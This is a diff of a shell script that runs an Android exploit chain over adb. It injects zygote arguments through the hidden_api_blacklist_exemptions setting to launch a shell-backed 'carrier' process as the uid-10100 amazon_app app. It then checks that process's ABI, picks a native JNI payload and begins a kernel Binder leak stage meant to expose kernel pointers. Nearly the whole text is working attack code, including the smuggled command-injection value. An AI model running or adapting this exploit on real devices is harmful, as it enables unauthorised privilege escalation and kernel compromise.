@@ -21,8 +21,6 @@ repo_dir="$(CDPATH= cd -- "$(dirname -- "$0")/.." && pwd)"
 adb_bin="${ADB:-$repo_dir/tools/adb-portable.sh}"
 asset_dir=/data/securedStorageLocation/codex.amazon.jni.v51
 probe_port=43271
-forward_port=43212
-socket_name=codex_amazon_app_v51a
 nice_name=codex-system-amazon-v52
 payload_device="${1:-}"
 waiter_dir=/data/securedStorageLocation/w
@@ -94,25 +92,14 @@ carrier_start() {
 --setgroups=3003
 --nice-name='"$nice_name"'
 --seinfo=amazonapp:targetSdkVersion=22:complete
-com.android.internal.os.WebViewZygoteInit
---zygote-socket='"$socket_name"'
+--invoke-with
+/system/bin/sh '"$asset_dir"'/carrier_launcher.sh;
 '
   {
     printf 'settings put global hidden_api_blacklist_exemptions "%s"\n' "$payload"
     printf 'settings delete global hidden_api_blacklist_exemptions\n'
   } | adb shell >/dev/null 2>&1
 
-  adb forward --remove "tcp:$forward_port" >/dev/null 2>&1 || true
-  adb forward "tcp:$forward_port" "localabstract:$socket_name" >/dev/null
-
-  resp="$(python3 "$repo_dir/scripts/webview_zygote_preload_client.py" \
-    --port "$forward_port" \
-    --package "$asset_dir/agent.jar" \
-    --libs "$asset_dir" \
-    --library libcodex_jni.so \
-    --cache-key "$asset_dir/agent.jar" 2>&1 | tail -1)"
-  echo "preload_response=$resp"
-  [ "$resp" = "preload_response=1" ] || return 1
   for i in $(seq 1 20); do
     carrier_up && return 0
     sleep 1
@@ -121,7 +108,7 @@ com.android.internal.os.WebViewZygoteInit
 }
 
 if ! carrier_up; then
-  echo "carrier absent -> respawn via WebViewZygoteInit injection"
+  echo "carrier absent -> spawn deterministic app_process64 carrier"
   carrier_start || die "carrier respawn failed"
   echo "carrier respawned, PONG"
 else
@@ -130,15 +117,52 @@ fi
 identity="$(carrier_identity)"
 echo "carrier_identity=$identity"
 case "$identity" in
-  *uid=10100*context=u:r:amazon_app:s0*) : ;;
-  *) die "carrier is not the required uid-10100/amazon_app process: $identity" ;;
+  *uid=10100*context=u:r:amazon_app:s0*Groups=*3003*) : ;;
+  *) die "carrier is not the required uid-10100/amazon_app process with group 3003: $identity" ;;
 esac
+
+carrier_pid="$(printf '%s\n' "$identity" | sed -n 's/.* pid=\([0-9][0-9]*\).*/\1/p')"
+[ -n "$carrier_pid" ] || die "carrier ID did not include a PID: $identity"
+supported_abis="$(adb shell getprop ro.product.cpu.abilist 2>&1 | tr -d '\r')"
+[ -n "$supported_abis" ] || supported_abis="$(adb shell getprop ro.product.cpu.abi | tr -d '\r')"
+remote_elf_class() {
+  bytes="$(adb shell "toybox od -An -t u1 -N 5 '$1' 2>/dev/null" | tr -d '\r' | tr -s ' ' | sed 's/^ //')"
+  case "$bytes" in
+    "127 69 76 70 1") echo ELF32 ;;
+    "127 69 76 70 2") echo ELF64 ;;
+    *) echo UNKNOWN ;;
+  esac
+}
+carrier_class="$(printf '%s\n' "$identity" | sed -n 's/.* elf=\([^ ]*\).*/\1/p')"
+reported_abi="$(printf '%s\n' "$identity" | sed -n 's/.* abi=\([^ ]*\).*/\1/p')"
+selected_jni="$(printf '%s\n' "$identity" | sed -n 's/.* jni=\([^ ]*\).*/\1/p')"
+case "$carrier_class" in ELF64) carrier_abi=arm64-v8a ;; ELF32) carrier_abi=armeabi-v7a ;; *)
+  die "carrier could not determine ELF class from /proc/self/exe: $identity" ;; esac
+[ "$reported_abi" = "$carrier_abi" ] \
+  || die "carrier ABI report disagrees with its ELF class: abi=$reported_abi elf=$carrier_class"
+expected_jni="$asset_dir/libhwbinder_target.$carrier_abi.so"
+[ "$selected_jni" = "$expected_jni" ] \
+  || die "carrier selected unexpected JNI path: selected=$selected_jni expected=$expected_jni"
+native_path="$selected_jni"
+native_class="$(remote_elf_class "$native_path")"
+selected_class="$native_class"
+echo "device_supported_abis=$supported_abis"
+echo "carrier_pid=$carrier_pid carrier_uid_context=$identity"
+echo "carrier_abi=$carrier_abi carrier_elf_class=$carrier_class"
+echo "selected_jni_library=$selected_jni selected_elf_class=$selected_class"
+echo "native_library=$native_path native_elf_class=$native_class"
+[ "$selected_class" = "$carrier_class" ] \
+  || die "no compatible packaged JNI payload for carrier $carrier_pid ($carrier_class)"
+[ "$native_class" = "$carrier_class" ] \
+  || die "selected JNI payload does not match carrier $carrier_pid: carrier=$carrier_class native=$native_class selected=$selected_jni"
+[ "$carrier_class" = ELF64 ] \
+  || die "32-bit Binder compat ABI cannot carry the primitive's 64-bit kernel pointers; deterministic app_process64 carrier launch failed"
 
 stage_hdr "3/7 stateful leak (boot-spent on ENODATA; reboot to retry)"
 # Single shot on the fresh carrier. ENODATA (0x50+errno 61) means the
 # replace-marker missed but binder nodes stay active in the kernel AND in the
-# carrier process; a respawned WebViewZygoteInit cannot rebind the taken
-# abstract socket, and shell (uid 2000) cannot kill the uid-10100 carrier, so
+# carrier process; a replacement cannot bind the occupied probe port, and
+# shell (uid 2000) cannot kill the uid-10100 carrier, so
 # EALREADY follows until the whole device reboots. Leak success is
 # result=0x5000000000000000.
 run_leak() {
